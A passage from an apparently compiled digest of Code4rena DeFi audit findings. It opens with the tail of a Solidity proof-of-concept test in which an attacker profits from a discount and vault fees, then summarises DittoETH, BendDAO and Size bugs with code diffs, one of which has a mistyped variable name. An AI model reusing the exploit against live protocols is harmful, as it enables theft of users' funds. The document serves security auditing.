    token.approve(address(rebasingToken), 1_000_000 ether);
    rebasingToken.deposit(1_000_000 ether, users);
    assertEq(rebasingToken.totalAssets(), 1_000_000 ether);
    assertEq(rebasingToken.balanceOf(users), 1_000_000 ether);
    // The attacker gets yDUSD shares.
    vm.startPrank(attacker);
    token.approve(address(rebasingToken), 1_000_000 ether);
    rebasingToken.deposit(1_000_000 ether, attacker);
    uint256 preAttackTotalAssets = rebasingToken.totalAssets();
    assertEq(preAttackTotalAssets, 2_000_000 ether);
    assertEq(rebasingToken.balanceOf(attacker), 1_000_000 ether); // The attacker owns half of the shares in this example.
    // The attacker causes a discount by asking for only 99% of the saved price on 454_546 ether dUSD.
    // This implies a trade loss of 0.01 * 454_546 ether = 4_545.46 ether dUSD.
    uint80 savedPrice = uint80(diamond.getProtocolAssetPrice(asset));
    uint80 askPrice = uint80(savedPrice.mul(0.99 ether));
    uint80 bidPrice = uint80(savedPrice.mul(0.99 ether));
    fundLimitBidOpt(bidPrice, 1_000_000 ether, receiver);
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, askPrice, O.LimitAsk, 1);
    createAsk(askPrice, 454_546 ether, C.LIMIT_ORDER, orderHintArray, attacker); // 0.01 * 50_000_000 / (1 + 10 * 0.01) ≈ 454_546
    // However, the yDUSD vault has been minted 50_000 ether dUSD in fees, of which half can be claimed by the attacker.
    assertEq(rebasingToken.totalAssets() - preAttackTotalAssets, 50_000 ether);
    assertEq(rebasingToken.convertToAssets(rebasingToken.balanceOf(attacker)), 1_000_000 ether + 25_000 ether - 1);
    // Trading back to normal, which removes the discount.
    // The attacker can trade back his ethEscrow for dUSD and withdraw his ercEscrow (just for profit accounting).
    orderHintArray = diamond.getHintArray(asset, savedPrice, O.LimitAsk, 1);
    createAsk(savedPrice, 1_000_000 ether, C.LIMIT_ORDER, orderHintArray, receiver);
    limitBidOpt(savedPrice, 4000 * diamond.getVaultUserStruct(vault, attacker).ethEscrowed, attacker);
    vm.startPrank(attacker);
    diamond.withdrawAsset(asset, diamond.getAssetUserStruct(asset, attacker).ercEscrowed);
    // Others deposit before the attacker can propose a withdrawal.
    vm.startPrank(dilutors);
    token.approve(address(rebasingToken), 5_000_000 ether);
    rebasingToken.deposit(5_000_000 ether, dilutors);
    assertEq(rebasingToken.totalAssets(), 7_050_000 ether);
    // The attacker wants to claim his profit.
    skip(5 minutes);
    vm.startPrank(attacker);
    rebasingToken.proposeWithdraw(1_025_000 ether);
    // Others deposit before the attacker can withdraw.
    vm.startPrank(dilutors);
    token.approve(address(rebasingToken), 5_000_000 ether);
    rebasingToken.deposit(5_000_000 ether, dilutors);
    assertEq(rebasingToken.totalAssets(), 12_050_000 ether);
    // This actually makes no difference to the attacker's share of the vault, because of how vaults work.
    assertEq(rebasingToken.convertToAssets(rebasingToken.balanceOf(attacker)), 1_025_000 ether);
    // The attacker can withdraw later.
    skip(7 days);
    vm.startPrank(attacker);
    rebasingToken.withdraw(0, attacker, attacker);
    // The attacker has gained 25_000 ether dUSD at a cost of 4_545.46 ether dUSD, i.e. a profit of 20_454.54 ether dUSD.
    assertEq(token.balanceOf(attacker) - attackerInitialAssets, 20_454.54 ether);
}

```

</details>

## 24.[High] DUSD assets can be minted with less ETH collateral than required

### Less collateral than required

- Summary: A vulnerability in the cancelShort function allows users or attackers to mint DUSD assets with less ETH collateral than required. By canceling a partially filled short order with a debt below the minimum threshold, the system mints additional DUSD based on stale prices and potentially low collateral ratios. This results in the attacker receiving free DUSD, which can de-peg the token. The issue persists despite previous attempts to fix it.

- Impact & Recommendation: Use current prices and initial collateral ratios when calculating the necessary collateral.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-dittoeth#h-02-DUSD-assets-can-be-minted-with-less-ETH-collateral-than-required) & [Report](https://code4rena.com/reports/2024-07-dittoeth)

<details><summary>POC</summary>

```solidity
    // Credit:
    //  - Original by: nonseodion
    //  - Modified by: serial-coder
    function cancelShort(address asset, uint16 id) internal {
        ...
        if (shortRecord.status == SR.Closed) {
            ...
        } else {
            uint256 minShortErc = LibAsset.minShortErc(Asset);
           if (shortRecord.ercDebt < minShortErc) {
                // @dev prevents leaving behind a partially filled SR under minShortErc
                // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
                uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
                {
                    STypes.Vault storage Vault = s.vault[vault];
-                   uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);
+                   uint256 newCR = convertCR(
+                       shortOrder.shortOrderCR < s.asset[asset].initialCR ? s.asset[asset].initialCR : shortOrder.shortOrderCR
+                   );
+                   uint80 price = uint80(LibOracle.getSavedOrSpotOraclePrice(asset));
+                   uint88 collateralDiff = price.mulU88(debtDiff).mulU88(newCR);
                    LibShortRecord.fillShortRecord(
                        asset,
                        shorter,
                        shortRecordId,
                        SR.FullyFilled,
                        collateralDiff,
                        debtDiff,
                        Asset.ercDebtRate,
                        Vault.dethYieldRate,
                        0
                    );
                    Vault.dethCollateral += collateralDiff;
                    Asset.dethCollateral += collateralDiff;
                    Asset.ercDebt += debtDiff;
                    // @dev update the eth refund amount
                    eth -= collateralDiff;
                }
                // @dev virtually mint the increased debt
                s.assetUser[asset][shorter].ercEscrowed += debtDiff;
            } else {
                ...
            }
        }
        ...
    }

```

</details>

## 25.[Medium] Incorrect accounting of utilization, supply/borrow rates due to vulnerable implementation in IsolateLogic::executeIsolateLiquidate

### Incorrect accounting of utilization, supply/borrow rates

- Summary: When the loan is auctioned and the bid amount does not fully cover the total debt, the liquidator has to pay an additional amount, called `extraAmount**.` The problem lies in how the interest rates and utilization rates are updated. Specifically, the function `InterestLogic::updateInterestRates` uses an incorrect value, `(vars.totalBorrowAmount + vars.totalExtraAmount)`, which inflates the added liquidity. This leads to an artificially high `availableLiquidityPlusDebt` value, causing the `utilization rate` to be lower than it should be. This incorrect calculation results in inaccurate borrow and supply rates.

- Impact & Recommendation: Change the function call to `InterestLogic.updateInterestRates(poolData, debtAssetData, vars.totalBorrowAmount, 0)` to avoid including the `extraAmount` in the liquidity calculation.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-benddao#m-14-Incorrect-accounting-of-utilization,-supply/borrow-rates-due-to-vulnerable-implementation-in-IsolateLogic::executeIsolateLiquidate) & [Report](https://code4rena.com/reports/2024-07-dittoeth)

<details><summary>POC</summary>

```solidity

//src/libraries/logic/IsolateLogic.sol
  function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {
...
    for (vars.nidx = 0; vars.nidx < params.nftTokenIds.length; vars.nidx++) {
...
      // Last bid can not cover borrow amount and liquidator need pay the extra amount
      if (loanData.bidAmount < vars.borrowAmount) {
|>      vars.extraBorrowAmounts[vars.nidx] = vars.borrowAmount - loanData.bidAmount;//@audit-info note: vars.borrowAmount = extraAmount + loanData.bidAmount
      }
...
    // update interest rate according latest borrow amount (utilization)
      //@audit (vars.totalBorrowAmount + vars.totalExtraAmount) is incorrect input, which inflates `liquidityAdded` in updateInterestRates.
|>    InterestLogic.updateInterestRates(poolData, debtAssetData, (vars.totalBorrowAmount + vars.totalExtraAmount), 0);
    // bid already in pool and now repay the borrow but need to increase liquidity
      //@audit-info note: only total debt (vars.totalBorrowAmount) are added to liquidity.
|>    VaultLogic.erc20TransferOutBidAmountToLiqudity(debtAssetData, vars.totalBorrowAmount);
...

  function updateInterestRates(
    DataTypes.PoolData storage poolData,
    DataTypes.AssetData storage assetData,
    uint256 liquidityAdded,
    uint256 liquidityTaken
  ) internal {
...
    // calculate the total asset supply
    vars.availableLiquidityPlusDebt =
      assetData.availableLiquidity +
|>    liquidityAdded -
      liquidityTaken +
      vars.totalAssetDebt;
    if (vars.availableLiquidityPlusDebt > 0) {
      vars.assetUtilizationRate = vars.totalAssetDebt.rayDiv(vars.availableLiquidityPlusDebt);
    }
...
      vars.nextGroupBorrowRate = IInterestRateModel(loopGroupData.rateModel).calculateGroupBorrowRate(
        vars.loopGroupId,
        vars.assetUtilizationRate
      );
...



```

</details>

## 26.[Medium] Multicall does not work as intended

### Fail to detect when the cap has been exceeded

- Summary: The multicall function in the Size.sol contract allows users to perform multiple protocol actions, such as depositing and repaying in a single transaction, while bypassing token caps. However, a specific invariant is violated when borrowAToken supply increases more than the decrease in debtToken supply, resulting in unintended behavior.

- Impact & Recommendation: Replace borrowAToken.balanceOf(address(this)) with borrowAToken.totalSupply() in the multicall function to ensure proper supply tracking and revert the transaction when the invariant is broken.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-size#m-01-Multicall does not work as intended) & [Report](https://code4rena.com/reports/2024-06-size)

<details><summary>POC</summary>

```solidity

/// @notice Provides a function to batch together multiple calls in a single external call.
/// @custom:security-contact security@size.credit
/// @author Size (https://size.credit/)
/// @author OpenZeppelin (https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/v5.0.2/contracts/utils/Multicall.sol), Size
/// @dev Add `payable` keyword to OpenZeppelin multicall implementation
///      Functions should not rely on `msg.value`. See the security implications of this change:
///        - https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/215
///        - https://github.com/Uniswap/v3-periphery/issues/52
///        - https://forum.openzeppelin.com/t/query-regarding-multicall-fucntion-in-multicallupgradeable-sol/35537
///        - https://twitter.com/haydenzadams/status/1427784837738418180?lang=en
library Multicall {
    using CapsLibrary for State;
    using RiskLibrary for State;

    /// @dev Receives and executes a batch of function calls on this contract.
    /// @custom:oz-upgrades-unsafe-allow-reachable delegatecall
    function multicall(State storage state, bytes[] calldata data) internal returns (bytes[] memory results) {
        state.data.isMulticall = true;

        uint256 borrowATokenSupplyBefore = state.data.borrowAToken.balanceOf(address(this));
        uint256 debtTokenSupplyBefore = state.data.debtToken.totalSupply();

        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }

        uint256 borrowATokenSupplyAfter = state.data.borrowAToken.balanceOf(address(this));
        uint256 debtTokenSupplyAfter = state.data.debtToken.totalSupply();

        state.validateBorrowATokenIncreaseLteDebtTokenDecrease(
            borrowATokenSupplyBefore, debtTokenSupplyBefore, borrowATokenSupplyAfter, debtTokenSupplyAfter
        );

        state.data.isMulticall = false;
    }
}


    function multicall(State storage state, bytes[] calldata data) internal returns (bytes[] memory results) {
        state.data.isMulticall = true;
-       uint256 borrowATokenSupplyBefore = state.data.borrowAToken.balanceOf(address(this));
+       uint256 borrowATokenSupplyBefore = state.data.borrowAToken.totalSupply();
        uint256 debtTokenSupplyBefore = state.data.debtToken.totalSupply();
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
-       uint256 borrowATokenSupplyBefore = state.data.borrowAToken.balanceOf(address(this));
+       uint256 borrowATokenSupplyBefore = state.data.borrowAToken.totalSupply();
        uint256 debtTokenSupplyAfter = state.data.debtToken.totalSupply();
        state.validateBorrowATokenIncreaseLteDebtTokenDecrease(
            borrowATokenSupplyBefore, debtTokenSupplyBefore, borrowATokenSupplyAfter, debtTokenSupplyAfter
        );
        state.data.isMulticall = false;
    }
}

```

</details>
